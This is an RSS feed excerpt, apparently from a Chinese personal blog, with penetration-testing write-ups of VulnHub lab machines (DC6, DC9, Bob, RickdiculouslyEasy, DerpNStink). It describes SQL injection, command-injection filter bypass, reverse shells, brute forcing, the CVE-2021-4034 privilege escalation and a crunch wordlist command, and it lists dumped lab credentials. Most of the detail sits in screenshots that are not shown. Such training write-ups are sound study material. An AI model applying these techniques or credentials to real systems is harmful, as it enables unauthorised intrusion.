&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe0313ea0b07adb6cbbb8ef62a89ce8baimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3b2a9839877abbcd2cefd3c177db9883image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有sql注入waf?&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5b39249a3b9f008fe0828ad3f52d270dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6c95faf70a9502ef926960f19cd26602image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1c292aa631ef05accfdcb3ebe0ac0415image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可能有漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3a71ca80b73e448d1ff12d0a65051eceimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;下载1191.pl&lt;/p&gt;
&lt;p&gt;perl运行可能会出错&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install libswitch-perl
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE81147f53fe55cba06c5d1210e4b5b0acimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEed3b1c959cb3e1036156779b25e43937image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE44ef020665741dd9f5a056dae6c2a1c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5b918c59f7e360ae1a2ddf7d1a621e1fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;/var下面有数据库连接文件：&lt;/p&gt;
&lt;p&gt;也是root密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa29d0668f1532a49947403187e97d86dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x070 RickdiculouslyEasy1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x070-rickdiculouslyeasy1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x070-rickdiculouslyeasy1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5cbc3ff694af78babf329faafbeb8c40image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE67a9197bd0fd1203c02ca7a89084b0e4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbc19427b819251d2b91a35a3ad2e6264image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获得立足点&#34;&gt;获得立足点&lt;/h1&gt;
&lt;p&gt;疑似密码：&lt;/p&gt;
&lt;p&gt;Morty&lt;/p&gt;
&lt;p&gt;winter&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE49cfa6d319bbeb7b1c4ecaf419e2ca07image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;命令执行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE31945c2cf71da08cff40f47ab704d5a1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcdcf7ea6ebab7672f94dc0dfe8d6b656image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcb7bdedf7cddf620c13f569fa1ebafa2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是绕不过：&lt;/p&gt;
&lt;p&gt;只能试着读文件了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEddcc6ab190e9dbf6796ed17ab9ba113eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;root&lt;/p&gt;
&lt;p&gt;RickSanchez&lt;/p&gt;
&lt;p&gt;Morty&lt;/p&gt;
&lt;p&gt;Summer&lt;/p&gt;
&lt;p&gt;尝试登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8bd6eae8ed2a8c8f3b98646e070c0ad2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;这个机器上面全是这个猫猫图，多半是不会让我们这样方便的提权了，不喜欢ctf&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdca0a5632c4ff0ac47e8c8802f3908afimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;挨个到家目录下面翻查：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5de708d3010c45f84f10eacf363c7101image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用scp拷贝到本地：&lt;/p&gt;
&lt;p&gt;发现zip密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE62665b8b88ac0bc5806a1ad69eb1d4deimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;解开，注意这个flag，其实是safe命令的参数：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb5128f847ff32bd92bf899033bed3d2eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面到spluttered的家目录下面，可以发现safe程序：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE51b4736573a6e576f59e23318439d00eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里提示Ricks的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6ce4d89102e601752aff2508cb971051image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;一个大写字母，一个数字，和一个老乐队里面的单词：&lt;/p&gt;
&lt;p&gt;百度百科：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb767c55ea517874f0b5b3acae6b23326image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;也就是说关键词为&lt;/p&gt;
&lt;p&gt;用crunch生成字典：&lt;/p&gt;
&lt;p&gt;crunch 7 7 -t ,%Flesh&amp;gt;passwd.txt&lt;/p&gt;
&lt;p&gt;7 7 是指定长度为7到7&lt;/p&gt;
&lt;p&gt;-t是指定模板&lt;/p&gt;
&lt;p&gt;,代表大写字母&lt;/p&gt;
&lt;p&gt;%代表数字&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE79b25e966cfee71ba7fc0702d53269faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x071 Bob1.0.1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x071-bob1.0.1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x071-bob1.0.1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe818712cb227b360eb320209cf37d52cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4df2fbf81b8db62da924d1c2f7c4072aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe1b6ee82eb4503ac9ee331728988798eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2243f96945f00d59f6d799b326f4c3f7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3084544bc7c71d74b6312fdefd363a0dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这不会又是什么加密吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE445a47e8db61acb4da0f7e4cd6afb368image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;命令执行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbddc5b42914553dcfe24ca3c402393faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有拦截，但是|就可以绕过，反弹一个shell回来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5c98a657ecd914416d974d69c358877fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是这里记得使用&amp;amp;让命令后台运行，要不然容易断开：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd681f4f460c3e8a00ba136e8f5fa8cfbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;这里琢磨一下怎么提权：&lt;/p&gt;
&lt;p&gt;这里其实考虑几个问题，systemctl这个命令的执行的目录路径是什么，能否劫持后面的程序路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE461a1d12c59d5d6860ceee26f2116c08image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个apache2 * *号的位置一般是重启，启动之类的操作，这里应该是有说法：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE683f3c6201669cf873431667c97b09e9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是居然没有server程序：&lt;/p&gt;
&lt;p&gt;算了，2021-4034秒了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc870a1390371b7b1077cc19565912c60image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x072 DC6</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x072-dc6/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x072-dc6/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf8a0179c6aa9f1aa4029d0e9c794d6d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd31b14da0c25dfd360f382a1c0206f94image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8e4b7281e3855eefb901128c3fde400cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;端口不多，就22和80，先看80吧&lt;/p&gt;
&lt;p&gt;端口扫描&lt;/p&gt;
&lt;p&gt;目测有wordpress:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcae2a69814658ab27c84aa5ce672268aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa645e3772a574ab7f174619c29a18b7eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;需要修改hosts&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd3c3c9397aff2bf886c254520e4ca830image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;粗略一看，可能是插件有问题：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3fa5dbb1fa298937a7783fff544b5058image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是未发现插件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc341de589db96fcd2b71f38bd1f1544fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现很多用户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb39e4e4f43672f559834e7b79fcd79e4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;先爆破看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE29d55ac41c8976db30df7b0f779372daimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时ssh也开始爆破:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE577bee2726fbce1b3926c876150bbf80image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;作者，你真狗啊：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE15a69798209c2039cde23f10e61cedf0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE33597bbbbc5ceec1fefd48547fcc1978image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后台权限不是很高，查了一圈，发现已知漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaf51e671b8796657d83f9d97f35c7ee7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改目标和执行命令：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7b2b0e5016e034ae1b4be6c46db97d69image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdf07cda30ef9c066ed0bffadfac8f410image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0f96e09ca78c17a6e1c721d8c1dfd5d3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;meErKatZ&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa959351142bbd8be46d9f12e69f5e8a6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个密码试过所有用户了，不行，登录数据库，看看里面的密码，很可惜，都不能解密：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf4a07d6acd2cb240f0217e2a68220b78image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;在mark的家里面发现了这个信息：&lt;/p&gt;
&lt;p&gt;成功切换到graham用户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE51b3e4b50347b80396c599bd345eb076image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现有sudo权限，那么我们可能需要提权到jens用户了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbf49e682b966ca898e95a1e62deed860image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看了一下backups.sh的权限，当前用户所属组有修改权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE646711169ecaf177acfd3e963595273bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;直接修改后提权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8fbb1472a0e3e35aa5165e05e6c47c16image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc08f88d5f73492d49d21ffe8a3079095image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x073 DC9</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x073-dc9/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x073-dc9/</guid>
      <description>&lt;p&gt;这个靶机建议vm nat模式&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE977960ff23f1cfebfb6077563e543e05image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6f3e30f85f23583f61a257893db24b8aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc9d31a775c4b12a1c4c5da689aefb7f3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;2个端口，很清晰：&lt;/p&gt;
&lt;p&gt;改一下hosts:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE75aec6ef0f889e466ea2b7cdff669d77image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现sql注入：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE27299d357da930e7467d12243cff24d5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;库名：&lt;/p&gt;
&lt;p&gt;Staff&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7cb8e3b9324a0389f733a031fb565a28image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;表名：&lt;/p&gt;
&lt;p&gt;StaffDetails,Users&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9ed3d5fd55a9f907c32277b0980b4068image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;列名：&lt;/p&gt;
&lt;p&gt;UserID,Username,Password&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE219b99c235d8f84094ebfbb36af81861image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;数据：&lt;/p&gt;
&lt;p&gt;Position: 1&lt;!-- raw HTML omitted --&gt;Phone No: admin&lt;!-- raw HTML omitted --&gt;Email: 856f5de590ef37314e7c3bdf6f8a66dc&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE938c3ffaf8aebcc7e41372fd3fb65416image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可解密：&lt;/p&gt;
&lt;p&gt;transorbital1&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2792038bffb4355e7bf033374bee4a53image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录后台发现什么也没有：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd8bd9308b611dfc88e3eb8168e8d4e3dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;重新注入一个数据库：&lt;/p&gt;
&lt;p&gt;users&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6b3a1fa368f33d585e87f053d13d5376image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;marym,julied,fredf,barneyr,tomc,jerrym,wilmaf,bettyr,chandlerb,joeyt,rachelg,rossg,monicag,phoebeb,scoots,janitor,janitor2&lt;/p&gt;
&lt;p&gt;3kfs86sfd,468sfdfsd2,4sfd87sfd1,RocksOff,TC&amp;amp;TheBoyz,B8m#48sd,Pebbles,BamBam01,UrAG0D!,Passw0rd,yN72#dsd,ILoveRachel,3248dsds7s,smellycats,YR3BVxxxw87,Ilovepeepee,Hawaii-Five-0&lt;/p&gt;
&lt;p&gt;至此，数据库里面的所有内容，应该都被看完了，好像文件也写不进去：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEddfb778407b1d6acaa3300059eb9127aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好家伙，原来管理员界面有个文件不存在，提示是文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf6a5ea3d600cc98905fb331bf0a9b5ceimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后就是我知识盲区了，读取/proc/sched_debug 来查看Linux系统中任务的调度情况：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x074 DerpNStink1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x074-derpnstink1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x074-derpnstink1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1ad25f3af513423dda14b03983712467image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa3fd8424179526660ffeecdc2b404745image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEda526eff56628b7909d849afcee815aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;先看21端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9f7c8e9ed9b0f451fd64108ef906fcefimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE442d118e755c3374824b4e24636ab1c5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;首页源码发现&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0c6e057bc38ecc5c7148cafcf17aaa2cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;二级目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE788c77bc986a3f50c2dfe00ff2acb9acimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
